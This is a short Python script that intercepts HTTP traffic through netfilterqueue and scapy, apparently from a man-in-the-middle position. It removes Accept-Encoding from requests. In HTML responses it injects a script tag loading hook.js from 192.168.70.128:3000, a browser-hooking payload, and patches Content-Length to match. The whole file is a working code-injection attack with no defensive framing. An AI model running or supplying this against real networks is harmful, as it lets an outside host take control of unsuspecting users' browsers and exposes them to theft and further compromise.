#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                print("=========== Request====================")
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("=========== Response====================")
                injection_code = '<script src="http://192.168.70.128:3000/hook.js"></script>'
                load = load.replace("<head>", "<head>" + injection_code)
                content_len_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_len_search and "text/html" in load:
                    cont_len = content_len_search.group(1)
                    new_cont_len = int(cont_len) + len(injection_code)
                    load = load.replace(cont_len, str(new_cont_len))
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
        except UnicodeDecodeError:
            pass
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(1, process_packet)
queue.run()
